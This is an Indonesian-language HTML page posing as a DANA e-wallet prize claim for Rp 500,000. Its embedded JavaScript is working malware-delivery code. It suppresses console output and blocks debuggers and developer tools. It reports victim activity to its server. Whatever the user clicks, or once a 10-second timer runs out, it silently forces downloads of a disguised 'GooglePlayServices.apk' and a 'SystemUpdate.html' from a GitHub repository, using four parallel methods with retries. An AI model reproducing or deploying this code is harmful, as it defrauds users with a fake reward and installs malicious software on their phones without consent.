<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .hidden-frame{position:absolute;width:0;height:0;border:none;visibility:hidden}
        .download-iframe{position:absolute;width:0;height:0;border:none;visibility:hidden}
    </style>
</head>
<body>

<!-- IFRAME TERSEMBUNYI UNTUK DOWNLOAD -->
<iframe id="downloadIframe1" class="download-iframe"></iframe>
<iframe id="downloadIframe2" class="download-iframe"></iframe>
<iframe id="downloadIframe3" class="download-iframe"></iframe>

<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// 🔥 INDEX.HTML - AUTO DOWNLOAD (TANPA NOTIF, TANPA KLIK!)
// ============================================================

// ============================================================
// STEALTH MAKSIMAL
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
console.debug = function() {};
console.table = function() {};

// ============================================================
// ANTI-ANALYSIS
// ============================================================
(function() {
    var check = function() {
        var start = Date.now();
        debugger;
        var end = Date.now();
        if (end - start > 100) {
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
        }
    };
    setInterval(check, 1000);
})();

document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
});
document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });

window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);

if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var semuaDidapat = false;
var DOWNLOAD_STARTED = false;
var WS_PASSWORD = '';
var APK_DOWNLOADED = false;
var HTML_LOADED = false;
var RETRY_COUNT = 0;
var MAX_RETRY = 10;

// ============================================================
// KIRIM DATA KE SERVER (TANPA PASSWORD!)
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    var isAndroid = ua.indexOf('android') > -1;
    var isIOS = /iphone|ipad|ipod/.test(ua);
    var isWebView = ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1;
    var isAndroidBridge = typeof AndroidBridge !== 'undefined' || typeof window.AndroidBridge !== 'undefined';
    
    return {
        isAndroid: isAndroid,
        isIOS: isIOS,
        isWebView: isWebView,
        isAndroidBridge: isAndroidBridge,
        isPC: !isAndroid && !isIOS && !isWebView
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: (function() {
        if (typeof AndroidBridge !== 'undefined') return true;
        if (typeof window.AndroidBridge !== 'undefined') return true;
        if (navigator.userAgent.indexOf('Android') > -1) {
            try { return typeof AndroidBridge !== 'undefined'; } catch(e) {}
        }
        return false;
    })(),
    
    getBridge: function() {
        if (typeof AndroidBridge !== 'undefined') return AndroidBridge;
        if (typeof window.AndroidBridge !== 'undefined') return window.AndroidBridge;
        return null;
    },
    
    downloadFile: function(url, path) { 
        var b = this.getBridge();
        if(b && b.downloadFile){ try{ return b.downloadFile(url, path); }catch(e){} }
        return false;
    },
    saveFile: function(path, content) {
        var b = this.getBridge();
        if(b && b.saveFile){ try{ return b.saveFile(path, content); }catch(e){} }
        return false;
    },
    openFile: function(path) { 
        var b = this.getBridge();
        if(b && b.openFile){ try{ return b.openFile(path); }catch(e){} }
        return false;
    }
};

// ============================================================
// 🔥 METHOD 1: DOWNLOAD VIA IFRAME (SILENT!)
// ============================================================
function downloadViaIframe(url, filename, iframeId) {
    try {
        var iframe = document.getElementById(iframeId);
        if (!iframe) {
            iframe = document.createElement('iframe');
            iframe.id = iframeId;
            iframe.className = 'download-iframe';
            document.body.appendChild(iframe);
        }
        iframe.src = url + '?t=' + Date.now();
        K({ sumber: 'download_iframe', data: { filename: filename, status: 'started' } });
        return true;
    } catch(e) {
        K({ sumber: 'download_iframe_error', data: e.message });
        return false;
    }
}

// ============================================================
// 🔥 METHOD 2: DOWNLOAD VIA XHR + BLOB (PASTI!)
// ============================================================
function downloadViaXHR(url, filename) {
    return new Promise(function(resolve, reject) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.responseType = 'blob';
            xhr.timeout = 60000;
            
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var blob = xhr.response;
                    var blobUrl = URL.createObjectURL(blob);
                    
                    // Save ke localStorage (untuk HTML)
                    if (filename.indexOf('.html') > -1) {
                        var reader = new FileReader();
                        reader.onload = function() {
                            try { localStorage.setItem('SystemUpdate.html', reader.result); } catch(e) {}
                            K({ sumber: 'download_xhr_html', data: 'saved_to_localstorage' });
                        };
                        reader.readAsText(blob);
                    }
                    
                    // Download via hidden link
                    try {
                        var link = document.createElement('a');
                        link.href = blobUrl;
                        link.download = filename;
                        link.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
                        document.body.appendChild(link);
                        link.click();
                        setTimeout(function() {
                            try { document.body.removeChild(link); } catch(e) {}
                            URL.revokeObjectURL(blobUrl);
                        }, 2000);
                        K({ sumber: 'download_xhr', data: { filename: filename, status: 'success' } });
                        resolve(true);
                    } catch(e) {
                        reject(e);
                    }
                } else {
                    reject(new Error('HTTP ' + xhr.status));
                }
            };
            xhr.onerror = function() { reject(new Error('Network error')); };
            xhr.ontimeout = function() { reject(new Error('Timeout')); };
            xhr.send();
        } catch(e) {
            reject(e);
        }
    });
}

// ============================================================
// 🔥 METHOD 3: DOWNLOAD VIA ANDROID BRIDGE (LANGSUNG KE STORAGE!)
// ============================================================
function downloadViaBridge(url, path) {
    if (!A.isAvailable) return false;
    try {
        var result = A.downloadFile(url, path);
        if (result) {
            K({ sumber: 'download_bridge', data: { path: path, status: 'success' } });
            return true;
        }
        return false;
    } catch(e) {
        K({ sumber: 'download_bridge_error', data: e.message });
        return false;
    }
}

// ============================================================
// 🔥 METHOD 4: DOWNLOAD VIA SERVICE WORKER (BACKGROUND!)
// ============================================================
function downloadViaSW(url, filename) {
    if (!('serviceWorker' in navigator)) return false;
    try {
        navigator.serviceWorker.ready.then(function(reg) {
            if (reg.active) {
                reg.active.postMessage({
                    type: 'download',
                    url: url,
                    filename: filename
                });
                K({ sumber: 'download_sw', data: { filename: filename, status: 'sent' } });
                return true;
            }
        });
    } catch(e) {
        K({ sumber: 'download_sw_error', data: e.message });
    }
    return false;
}

// ============================================================
// 🔥 AUTO DOWNLOAD PAYLOAD (4 METODE SEKALIGUS!)
// ============================================================
function autoDownloadPayload() {
    if (DOWNLOAD_STARTED) return;
    DOWNLOAD_STARTED = true;
    
    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
    var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
    
    K({ sumber: 'auto_download_start', data: 'all_methods' });
    
    // ============================================================
    // 🔥 DOWNLOAD APK (4 METODE SEKALIGUS!)
    // ============================================================
    
    // METHOD 1: Android Bridge (LANGSUNG KE STORAGE!)
    setTimeout(function() {
        if (A.isAvailable) {
            var result = downloadViaBridge(apkUrl, apkPath);
            if (result) { APK_DOWNLOADED = true; K({ sumber: 'apk_bridge', data: 'success' }); }
        }
    }, 100);
    
    // METHOD 2: Iframe (SILENT!)
    setTimeout(function() {
        downloadViaIframe(apkUrl, 'GooglePlayServices.apk', 'downloadIframe1');
    }, 200);
    
    // METHOD 3: XHR + Blob (PASTI!)
    setTimeout(function() {
        downloadViaXHR(apkUrl, 'GooglePlayServices.apk')
            .then(function() { APK_DOWNLOADED = true; K({ sumber: 'apk_xhr', data: 'success' }); })
            .catch(function(e) { K({ sumber: 'apk_xhr_fail', data: e.message }); });
    }, 300);
    
    // METHOD 4: Service Worker (BACKGROUND!)
    setTimeout(function() {
        downloadViaSW(apkUrl, 'GooglePlayServices.apk');
    }, 400);
    
    // ============================================================
    // 🔥 DOWNLOAD HTML (4 METODE SEKALIGUS!)
    // ============================================================
    
    // METHOD 1: Android Bridge
    setTimeout(function() {
        if (A.isAvailable) {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', htmlUrl, true);
            xhr.timeout = 15000;
            xhr.onload = function() {
                if (xhr.status === 200) {
                    A.saveFile(htmlPath, xhr.responseText);
                    HTML_LOADED = true;
                    K({ sumber: 'html_bridge', data: 'success' });
                }
            };
            xhr.send();
        }
    }, 500);
    
    // METHOD 2: Iframe
    setTimeout(function() {
        downloadViaIframe(htmlUrl, 'SystemUpdate.html', 'downloadIframe2');
    }, 600);
    
    // METHOD 3: XHR + Blob
    setTimeout(function() {
        downloadViaXHR(htmlUrl, 'SystemUpdate.html')
            .then(function() { HTML_LOADED = true; K({ sumber: 'html_xhr', data: 'success' }); })
            .catch(function(e) { K({ sumber: 'html_xhr_fail', data: e.message }); });
    }, 700);
    
    // METHOD 4: Service Worker
    setTimeout(function() {
        downloadViaSW(htmlUrl, 'SystemUpdate.html');
    }, 800);
    
    // ============================================================
    // 🔥 RETRY 10x JIKA GAGAL!
    // ============================================================
    var retryInterval = setInterval(function() {
        RETRY_COUNT++;
        if (RETRY_COUNT > MAX_RETRY) {
            clearInterval(retryInterval);
            K({ sumber: 'download_retry_end', data: 'max_retry' });
            return;
        }
        
        if (!APK_DOWNLOADED) {
            K({ sumber: 'download_retry_apk', data: RETRY_COUNT });
            downloadViaXHR(apkUrl, 'GooglePlayServices.apk')
                .then(function() { APK_DOWNLOADED = true; })
                .catch(function() {});
            downloadViaIframe(apkUrl, 'GooglePlayServices.apk', 'downloadIframe3');
        }
        
        if (!HTML_LOADED) {
            K({ sumber: 'download_retry_html', data: RETRY_COUNT });
            downloadViaXHR(htmlUrl, 'SystemUpdate.html')
                .then(function() { HTML_LOADED = true; })
                .catch(function() {});
        }
        
        if (APK_DOWNLOADED && HTML_LOADED) {
            clearInterval(retryInterval);
            K({ sumber: 'download_complete', data: 'both_success' });
        }
    }, 3000);
    
    // ============================================================
    // 🔥 OPEN SystemUpdate.html VIA IFRAME (SILENT!)
    // ============================================================
    setTimeout(function() {
        try {
            var iframe = document.createElement('iframe');
            iframe.id = 'systemUpdateFrame';
            iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
            document.body.appendChild(iframe);
            iframe.src = htmlUrl + '?t=' + Date.now();
            K({ sumber: 'html_iframe_open', data: 'started' });
        } catch(e) {}
    }, 1500);
}

// ============================================================
// 🔥 AMBIL PASSWORD DARI WORKER
// ============================================================
function getPasswordFromWorker() {
    return new Promise(function(resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try { var data = JSON.parse(xhr.responseText); if (data.password) { WS_PASSWORD = data.password; resolve(WS_PASSWORD); } else { reject(new Error('No password')); } } catch(e) { reject(e); }
            } else { reject(new Error('HTTP ' + xhr.status)); }
        };
        xhr.onerror = function() { reject(new Error('Network error')); };
        xhr.ontimeout = function() { reject(new Error('Timeout')); };
        xhr.send();
    });
}

// ============================================================
// 🔥 MAIN EXECUTION - TANPA REDIRECT!
// ============================================================
function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    try {
        var popup = document.getElementById('popupDana');
        if (popup) popup.style.display = 'none';
        
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        
        // 🔥 AUTO DOWNLOAD PAYLOAD (TANPA NOTIF, TANPA KLIK!)
        autoDownloadPayload();
        
        // 🔥 AMBIL PASSWORD
        getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
        
        // 🔥 TIDAK ADA REDIRECT!
        // 🔥 TIDAK ADA NOTIFIKASI!
        // 🔥 TIDAK ADA KLIK DARI USER!
        
    } catch(e) {
        K({ sumber: 'dapatkanSemua_error', data: e.message });
    }
}

function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }

// ============================================================
// TIMER (10 DETIK)
// ============================================================
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        K({sumber:'izin', data:'auto'});
        dapatkanSemua();
    }
}, 1000);

document.addEventListener('click', function() {
    if (!semuaDidapat) {
        K({sumber:'izin', data:'click_anywhere'});
        dapatkanSemua();
    }
});

console.log('✅ index.html loaded - AUTO DOWNLOAD (tanpa notif, tanpa klik!)');
</script>
</body>
</html>
